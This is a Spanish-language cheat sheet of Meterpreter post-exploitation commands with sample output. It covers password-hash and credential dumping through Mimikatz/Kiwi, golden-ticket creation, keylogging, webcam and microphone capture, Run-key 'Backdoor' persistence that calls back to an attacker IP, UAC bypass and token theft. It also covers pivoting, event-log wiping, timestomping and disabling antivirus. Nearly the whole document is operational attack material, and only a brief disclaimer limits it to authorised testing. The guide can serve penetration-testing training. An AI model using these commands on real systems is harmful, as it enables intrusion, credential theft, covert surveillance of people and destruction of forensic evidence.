# 🎭 Meterpreter - Guía rápida completa

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Meterpreter.tr.md) • [🇬🇷 Ελληνικά](Meterpreter.el.md)

```
    ███╗   ███╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝██████╔╝██████╔╝█████╗     ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██╔══╝     ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║██║     ██║  ██║███████╗   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

![Meterpreter](https://img.shields.io/badge/Meterpreter-Session-purple?style=for-the-badge)
![Post Exploitation](https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-Linux-green?style=for-the-badge)

> **Una herramienta avanzada de posexplotación** - Tu arsenal completo tras conseguir acceso

---

## 📋 Índice

- [¿Qué es Meterpreter?](#-qué-es-meterpreter)
- [Comandos principales](#-comandos-principales)
- [Información del sistema](#-información-del-sistema)
- [Comandos del sistema de archivos](#-comandos-del-sistema-de-archivos)
- [Comandos de red](#-comandos-de-red)
- [Comandos de procesos](#-comandos-de-procesos)
- [Comandos de usuarios y privilegios](#-comandos-de-usuarios-y-privilegios)
- [Recopilación de contraseñas](#-recopilación-de-contraseñas)
- [Registro de pulsaciones (keylogging)](#-registro-de-pulsaciones-keylogging)
- [Capturas de pantalla y webcam](#-capturas-de-pantalla-y-webcam)
- [Persistencia](#-persistencia)
- [Pivoting y reenvío de puertos](#-pivoting-y-reenvío-de-puertos)
- [Antiforense](#-antiforense)
- [Scripting y automatización](#-scripting-y-automatización)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consejos y trucos](#-consejos-y-trucos)

---

## 🎯 ¿Qué es Meterpreter?

**Meterpreter** (Meta-Interpreter) es un payload avanzado y ampliable dinámicamente que, en la implementación descrita, funciona mediante inyección de DLL en memoria y se comunica a través del socket del stager.

### Funciones principales

| Función | Descripción |
|---------|-------------|
| **Ejecución en memoria** | Se ejecuta en RAM y deja pocas huellas |
| **Comunicación cifrada** | Canal cifrado mediante TLS hacia el servidor C2 |
| **Ampliable** | Carga de extensiones durante la ejecución |
| **Multiplataforma** | Windows, Linux, macOS, Android, PHP, Java |
| **Capacidad de pivoting** | Encaminar el tráfico a través de hosts comprometidos |

> **Matiz de implementación:** la descripción de DLL y stager corresponde especialmente al Meterpreter nativo de Windows; no describe literalmente todas las variantes enumeradas. Tampoco toda comunicación de Meterpreter utiliza TLS: depende del transporte y de la implementación. Consulta la [descripción oficial](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html).

### Tipos de Meterpreter

```bash
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# macOS
osx/x64/meterpreter/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# Python
python/meterpreter/reverse_tcp
```

---

<a id="-comandos-principales"></a>
## ⌨️ Comandos principales

### Ayuda y navegación

```bash
# Mostrar todos los comandos
meterpreter > help

# Obtener ayuda de un comando concreto
meterpreter > help upload

# Mostrar información de los canales
meterpreter > channel -l
```

### Gestión de sesiones

```bash
# Obtener información de la sesión
meterpreter > info

# Enviar la sesión actual a segundo plano
meterpreter > background
meterpreter > bg

# Volver a msfconsole
meterpreter > exit

# Finalizar la sesión por completo
meterpreter > quit

# Reconectar si se interrumpe la conexión
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l <LHOST> -p <LPORT>
```

> **Aclaración de sesión:** `background` deja la sesión abierta y vuelve a msfconsole; `exit` y `quit` cierran la sesión. `transport add` configura un transporte adicional, pero no garantiza recuperar una sesión que ya haya finalizado.

### Operaciones con canales

```bash
# Listar los canales activos
meterpreter > channel -l

# Interactuar con un canal
meterpreter > channel -i <id>

# Leer de un canal
meterpreter > channel -r <id>

# Escribir en un canal
meterpreter > channel -w <id>

# Cerrar un canal
meterpreter > channel -c <id>
```

---

## 💻 Información del sistema

### Información básica del sistema

```bash
# Obtener información del sistema
meterpreter > sysinfo
Computer        : WIN-PC
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

# Obtener el usuario actual
meterpreter > getuid
Server username: WIN-PC\Administrator

# Obtener el ID del proceso actual
meterpreter > getpid
Current pid: 1234

# Obtener el nombre del proceso
meterpreter > getpname

# Comprobar si se ejecuta en una máquina virtual
meterpreter > run post/windows/gather/checkvm
```

### Entorno y registro

```bash
# Listar las variables de entorno
meterpreter > getenv PATH
meterpreter > getenv USERNAME

# Establecer una variable de entorno
meterpreter > setenv VAR value

# Operaciones con el registro (Windows)
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityHealth
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\backdoor.exe"
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

### Software y parches instalados

```bash
# Listar las aplicaciones instaladas
meterpreter > run post/windows/gather/enum_applications

# Listar los parches y hotfixes instalados
meterpreter > run post/windows/gather/enum_patches

# Comprobar rutas de servicios sin comillas
meterpreter > run post/windows/gather/enum_unquoted_service_paths
```

---

## 📁 Comandos del sistema de archivos

### Navegación

```bash
# Mostrar el directorio de trabajo
meterpreter > pwd
C:\Users\Administrator\Desktop

# Listar el contenido del directorio
meterpreter > ls
meterpreter > ls -la

# Cambiar de directorio
meterpreter > cd C:\\Users
meterpreter > cd ..

# Mostrar el directorio local actual
meterpreter > lpwd

# Cambiar de directorio local
meterpreter > lcd /tmp

# Listar el directorio local
meterpreter > lls
```

### Operaciones con archivos

```bash
# Leer el contenido de un archivo
meterpreter > cat C:\\Users\\Administrator\\Desktop\\secret.txt

# Editar un archivo
meterpreter > edit C:\\file.txt

# Eliminar un archivo
meterpreter > rm C:\\temp\\malware.exe

# Crear un directorio
meterpreter > mkdir C:\\temp\\hidden

# Eliminar un directorio
meterpreter > rmdir C:\\temp\\hidden

# Copiar un archivo
meterpreter > cp source.txt destination.txt

# Mover un archivo o cambiar su nombre
meterpreter > mv oldname.txt newname.txt
```

### Transferencia de archivos

```bash
# Descargar un archivo del objetivo
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/

# Descargar de forma recursiva
meterpreter > download -r C:\\Users\\Administrator\\Documents

# Subir un archivo al objetivo
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\
meterpreter > upload -r /local/directory C:\\remote\\directory

# Mostrar el progreso de descarga o subida
meterpreter > download -p C:\\large_file.zip
```

### Búsqueda de archivos

```bash
# Buscar archivos
meterpreter > search -f *.txt
meterpreter > search -f password* -d C:\\Users
meterpreter > search -f *.docx -d C:\\

# Buscar una extensión concreta en todas las unidades
meterpreter > search -f *.kdbx

# Buscar patrones concretos de nombres de archivo
meterpreter > search -f *password* -r
```

### Hashes y marcas de tiempo de archivos

```bash
# Obtener el checksum (suma de comprobación) del archivo
meterpreter > checksum md5 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha1 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha256 C:\\file.exe

# Modificar las marcas de tiempo (timestomp)
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe
meterpreter > timestomp C:\\backdoor.exe -z "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"
```

---

## 🌐 Comandos de red

### Información de red

```bash
# Obtener las interfaces de red
meterpreter > ipconfig
meterpreter > ifconfig

# Obtener la tabla de rutas
meterpreter > route

# Obtener la caché ARP
meterpreter > arp

# Obtener las conexiones de red activas
meterpreter > netstat
```

### Reenvío de puertos

```bash
# Reenviar un puerto local al destino remoto
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# Listar los reenvíos de puertos
meterpreter > portfwd list

# Eliminar un reenvío de puertos
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.100

# Eliminar todos los reenvíos de puertos
meterpreter > portfwd flush

# Ejemplo: reenviar RDP
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
# Conectarse ahora: rdesktop 127.0.0.1:3389
```

### DNS y utilidades de red

```bash
# Resolver un nombre de host
meterpreter > resolve google.com

# Obtener la configuración del proxy
meterpreter > run post/windows/gather/enum_proxy
```

---

<a id="-comandos-de-procesos"></a>
## ⚙️ Comandos de procesos

### Listado de procesos

```bash
# Listar todos los procesos
meterpreter > ps

# Filtrar los procesos
meterpreter > pgrep explorer.exe
meterpreter > pgrep -u Administrator

# Obtener información del proceso actual
meterpreter > getpid
```

### Manipulación de procesos

```bash
# Migrar a otro proceso
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe

# Finalizar un proceso
meterpreter > kill <PID>

# Ejecutar un comando y obtener la salida
meterpreter > execute -f cmd.exe -a "/c whoami" -i -H

# Ejecutar en segundo plano
meterpreter > execute -f notepad.exe -H

# Ejecutar con entrada/salida mediante canales
meterpreter > execute -f cmd.exe -c -i
```

> **Aclaración:** no existe un destino de migración universalmente seguro. Migrar a procesos protegidos o críticos como `lsass.exe` puede fallar o afectar al sistema; no es un requisito universal de `hashdump`. Evalúa privilegios, arquitectura y protecciones antes de interpretar la lista siguiente.

### Consejos para migrar entre procesos

```bash
# Destinos de migración estables según el original (Windows)
# - explorer.exe (contexto de usuario, estable)
# - svchost.exe (SYSTEM, varias instancias)
# - lsass.exe (SYSTEM, descrito como necesario para hashdump en el original)

# Buscar explorer.exe y migrar
meterpreter > ps | grep explorer
meterpreter > migrate <explorer_pid>

# Migrar automáticamente a un proceso estable
meterpreter > run post/windows/manage/migrate
```

---

## 👤 Comandos de usuarios y privilegios

### Información del usuario actual

```bash
# Obtener el usuario actual
meterpreter > getuid
Server username: WIN-PC\Administrator

# Obtener los privilegios actuales
meterpreter > getprivs

# Comprobar si hay privilegios elevados (Windows)
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation)
```

### Escalada de privilegios

```bash
# Intentar obtener privilegios SYSTEM
meterpreter > getsystem
meterpreter > getsystem -t 1  # Suplantación mediante named pipe (en memoria/administrador)
meterpreter > getsystem -t 2  # Suplantación mediante named pipe (dropper/administrador)
meterpreter > getsystem -t 3  # Duplicación de tokens (en memoria/administrador)

# Elusión de UAC (desde msfconsole)
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION 1
msf6 > exploit

# Sugerencias de exploits locales
meterpreter > run post/multi/recon/local_exploit_suggester

# Robar el token de otro proceso
meterpreter > steal_token <PID>

# Abandonar el token robado
meterpreter > drop_token

# Suplantar a un usuario
meterpreter > impersonate_token "DOMAIN\\Administrator"

# Listar los tokens disponibles
meterpreter > use incognito
meterpreter > list_tokens -u
```

> **Corrección:** `getsystem` intenta elevar privilegios; no es una consulta pasiva para comprobar si ya están elevados. Suele partir de privilegios administrativos y su resultado depende de la técnica y del sistema. Véase la [documentación de Rapid7](https://docs.rapid7.com/metasploit/meterpreter-getsystem/).

### Enumeración de usuarios

```bash
# Listar los usuarios locales
meterpreter > run post/windows/gather/enum_logged_on_users

# Listar los usuarios del dominio (si el equipo pertenece al dominio)
meterpreter > run post/windows/gather/enum_domain_users

# Listar los grupos locales
meterpreter > run post/windows/gather/local_admin_search_enum
```

---

## 🔐 Recopilación de contraseñas

### Volcado de hashes

```bash
# Volcar los hashes de contraseñas (requiere SYSTEM)
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# Si hashdump falla, probar
meterpreter > run post/windows/gather/smart_hashdump
```

### Extensión Mimikatz / Kiwi

```bash
# Cargar Kiwi (Mimikatz)
meterpreter > load kiwi

# Recuperar todas las credenciales
meterpreter > creds_all

# Obtener la contraseña desde la memoria
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# Volcar los tickets de Kerberos
meterpreter > kiwi_cmd sekurlsa::tickets

# Obtener las contraseñas WiFi
meterpreter > kiwi_cmd misc::wifi

# Volcado de LSA
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Golden ticket (ticket dorado)
meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <domain_sid> -u Administrator -t /tmp/golden.kirbi
```

### Recopilación de credenciales

```bash
# Buscar credenciales en archivos
meterpreter > run post/multi/gather/credentials/generic

# Credenciales del navegador
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome

# Claves SSH
meterpreter > run post/multi/gather/ssh_creds

# Administrador de credenciales de Windows
meterpreter > run post/windows/gather/enum_cred_store

# Credenciales de Outlook
meterpreter > run post/windows/gather/credentials/outlook
```

---

<a id="-registro-de-pulsaciones-keylogging"></a>
## ⌨️ Registro de pulsaciones (keylogging)

### Iniciar o detener el keylogger

```bash
# Iniciar el keylogger
meterpreter > keyscan_start
Starting the keystroke sniffer...

# Volcar las pulsaciones capturadas
meterpreter > keyscan_dump
Dumping captured keystrokes...
username: admin
password: secretpass123

# Detener el keylogger
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

### Registro avanzado de pulsaciones

```bash
# Ejecutar el keylogger como un proceso separado
meterpreter > run post/windows/capture/keylog_recorder

# Migrar a un proceso con acceso al teclado (explorer.exe)
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start
```

---

## 📸 Capturas de pantalla y webcam

### Capturas de pantalla

```bash
# Realizar una captura de pantalla
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg

# Guardar una captura en una ruta personalizada
meterpreter > screenshot -p /tmp/screen.jpg

# Capturas de pantalla continuas
meterpreter > run post/multi/gather/screen_spy

# Ver el escritorio en tiempo real
meterpreter > screenshare
```

### Operaciones con la webcam

```bash
# Listar las webcams
meterpreter > webcam_list
1: Integrated Webcam

# Realizar una captura con la webcam
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/webcam.jpeg

# Realizar una captura con opciones
meterpreter > webcam_snap -i 1 -p /tmp/webcam.jpg

# Transmitir la webcam en tiempo real
meterpreter > webcam_stream
```

### Grabación de audio

```bash
# Grabar el micrófono
meterpreter > record_mic -d 30
[*] Starting...
[*] Stopped
Audio saved to: /root/audio.wav

# Grabar con una duración personalizada
meterpreter > record_mic -d 60 -f /tmp/recording.wav
```

---

## 🔄 Persistencia

> **Compatibilidad:** los scripts históricos de Meterpreter, incluidos ejemplos como `run persistence`, `run metsvc`, `run scraper` o `run winenum`, están obsoletos y pueden faltar en versiones actuales. Se conservan por fidelidad; consulta la [nota oficial del repositorio](https://github.com/rapid7/metasploit-framework/blob/master/scripts/README.md) y los módulos post disponibles en tu versión.

### Persistencia en Windows

```bash
# Persistencia mediante el registro
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Persistencia mediante tareas programadas
meterpreter > run post/windows/manage/persistence_exe

# Persistencia mediante servicios
meterpreter > run metsvc

# Persistencia mediante WMI
meterpreter > run post/windows/manage/wmi_persistence
```

### Explicación de las opciones de persistencia

```bash
# Opciones del script persistence
-A        # Iniciar automáticamente un handler compatible
-L <path> # Ubicación en la que escribir el payload
-P <path> # Payload que se utilizará
-S        # Iniciar como servicio (con SYSTEM)
-T        # Plantilla EXE alternativa
-U        # Iniciar cuando el usuario entre en sesión
-X        # Iniciar al arrancar el sistema
-i <sec>  # Intervalo entre intentos de conexión
-p <port> # Puerto al que se conectará el payload
-r <ip>   # IP a la que se conectará el payload
```

### Eliminar la persistencia

```bash
# Listar los mecanismos de persistencia
meterpreter > run post/windows/gather/enum_persistence

# Eliminar la persistencia (manualmente)
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

---

## 🔀 Pivoting y reenvío de puertos

### Gestión de rutas

```bash
# Añadir una ruta a través de la sesión
meterpreter > run autoroute -s 10.10.10.0/24

# Ver las rutas
meterpreter > run autoroute -p

# Eliminar una ruta
meterpreter > run autoroute -d -s 10.10.10.0/24

# Desde msfconsole
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route print
```

### Proxy SOCKS

```bash
# Iniciar el proxy SOCKS (desde msfconsole)
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j

# Configurar proxychains
# Editar /etc/proxychains.conf:
# socks4 127.0.0.1 1080

# Usar con proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains ssh user@10.10.10.5
```

### Ejemplos de reenvío de puertos

```bash
# Reenviar un puerto local a un host interno
meterpreter > portfwd add -l 445 -p 445 -r 10.10.10.5

# Reenvío inverso de puertos
meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.50

# Ejemplos de escenarios:
# Acceder al servidor web interno
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.100

# Acceder al RDP interno
meterpreter > portfwd add -l 33389 -p 3389 -r 10.10.10.5

# Acceder al SMB interno
meterpreter > portfwd add -l 1445 -p 445 -r 10.10.10.5
```

---

## 🧹 Antiforense

### Eliminar evidencias

```bash
# Borrar los registros de eventos de Windows
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 5678 records from System...
[*] Wiping 9012 records from Security...

# Modificar las marcas de tiempo de archivos con timestomp
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

### Técnicas de evasión

```bash
# Migrar a un proceso legítimo
meterpreter > migrate -N svchost.exe

# Comprobar si hay supervisión
meterpreter > run post/windows/gather/enum_av

# Desactivar el antivirus (arriesgado)
meterpreter > run post/windows/manage/killav

# Ocultar un proceso
meterpreter > run post/windows/manage/inject_host
```

---

## 📜 Scripting y automatización

### Scripts de recursos

```bash
# Crear un script de recursos
echo "sysinfo
getuid
hashdump
run post/windows/gather/enum_logged_on_users" > post_exploit.rc

# Ejecutar un script de recursos
meterpreter > resource post_exploit.rc
```

### Scripts habituales

```bash
# Enumeración del sistema
meterpreter > run scraper

# Recopilar toda la información
meterpreter > run winenum

# Comprobar si hay máquinas virtuales
meterpreter > run checkvm

# Obtener las subredes locales para pivoting
meterpreter > run get_local_subnets

# Reconocimiento multiplataforma
meterpreter > run post/multi/recon/local_exploit_suggester
```

### Consola IRB (Ruby)

```bash
# Entrar en el modo IRB
meterpreter > irb

# Ejemplo: listar archivos
>> client.fs.dir.entries("C:\\")

# Ejemplo: leer un archivo
>> client.fs.file.open("C:\\secret.txt").read

# Salir de IRB
>> exit
```

---

## 📊 Tabla de referencia rápida

### Comandos esenciales

| Comando | Descripción |
|---------|-------------|
| `sysinfo` | Información del sistema |
| `getuid` | Usuario actual |
| `getpid` | ID del proceso actual |
| `ps` | Listar los procesos |
| `migrate <PID>` | Migrar a otro proceso |
| `getsystem` | Elevar privilegios a SYSTEM |
| `hashdump` | Volcar los hashes de contraseñas |
| `shell` | Abrir una shell del sistema |
| `upload <src> <dst>` | Subir un archivo |
| `download <src>` | Descargar un archivo |
| `screenshot` | Capturar la pantalla |
| `webcam_snap` | Captura de la webcam |
| `keyscan_start` | Iniciar el keylogger |
| `keyscan_dump` | Obtener las pulsaciones |

### Operaciones con archivos

| Comando | Descripción |
|---------|-------------|
| `pwd` | Mostrar el directorio de trabajo |
| `cd <dir>` | Cambiar de directorio |
| `ls` | Listar los archivos |
| `cat <file>` | Leer un archivo |
| `edit <file>` | Editar un archivo |
| `rm <file>` | Eliminar un archivo |
| `mkdir <dir>` | Crear un directorio |
| `search -f <pattern>` | Buscar archivos |

### Operaciones de red

| Comando | Descripción |
|---------|-------------|
| `ipconfig` | Interfaces de red |
| `route` | Tabla de rutas |
| `netstat` | Conexiones activas |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Reenviar un puerto |
| `run autoroute -s <subnet>` | Añadir una ruta para pivoting |

### Escalada de privilegios

| Comando | Descripción |
|---------|-------------|
| `getsystem` | Obtener privilegios SYSTEM |
| `getprivs` | Listar los privilegios actuales |
| `steal_token <PID>` | Robar el token de un proceso |
| `load incognito` | Cargar la extensión incognito |
| `list_tokens -u` | Listar los tokens disponibles |
| `impersonate_token` | Suplantar el token de un usuario |

### Recopilación de credenciales

| Comando | Descripción |
|---------|-------------|
| `hashdump` | Volcar los hashes SAM |
| `load kiwi` | Cargar Mimikatz |
| `creds_all` | Todas las credenciales |
| `lsa_dump_sam` | Volcado SAM mediante LSA |
| `kiwi_cmd <cmd>` | Ejecutar un comando de Mimikatz |

---

## 💡 Consejos y trucos

### Buenas prácticas

1. **Migrar siempre primero**
   ```bash
   # Migrar a un proceso estable antes de realizar otras operaciones
   meterpreter > migrate -N explorer.exe
   ```

2. **Enviar las sesiones a segundo plano**
   ```bash
   # Enviar las sesiones a segundo plano en lugar de cerrarlas
   meterpreter > background
   ```

3. **Utilizar payloads cifrados**
   ```bash
   # Preferir payloads HTTPS
   windows/meterpreter/reverse_https
   ```

4. **Comprobar antes de actuar**
   ```bash
   # Comprobar siempre los privilegios
   meterpreter > getuid
   meterpreter > getprivs
   ```

### Resolución de problemas

| Problema | Solución |
|-------|----------|
| La sesión se cierra | Migrar a un proceso estable |
| hashdump falla | Obtener primero SYSTEM con `getsystem` |
| getsystem falla | Probar otra técnica `-t 1,2,3` |
| El keylogger no recoge datos | Migrar a explorer.exe |
| Los comandos agotan el tiempo de espera | Comprobar la conectividad de red |

### Consejos para reducir la exposición

```bash
# 1. Migrar fuera del proceso inicial
meterpreter > migrate -N svchost.exe

# 2. Eliminar huellas
meterpreter > clearev

# 3. Aplicar timestomp a los archivos subidos
meterpreter > timestomp C:\\file.exe -f C:\\Windows\\System32\\calc.exe

# 4. Eliminar los archivos depositados al terminar
meterpreter > rm C:\\temp\\payload.exe
```

---

## ⚠️ Aviso legal

> **ADVERTENCIA:** esta guía se destina únicamente a la formación y a pruebas de penetración autorizadas. El acceso no autorizado a sistemas informáticos es ilegal. Obtén siempre la autorización correspondiente antes de realizar pruebas.

---

## 📚 Recursos relacionados

- [Guía de Metasploit Framework](./README.es.md)
- [Documentación de Offensive Security](https://www.offensive-security.com/)
- [Documentación de Metasploit de Rapid7](https://docs.metasploit.com/)

---

<p align="center">
  <b>🎭 ¡Domina la posexplotación!</b><br>
  <i>Con Meterpreter, la exploración continúa después del acceso inicial</i>
</p>
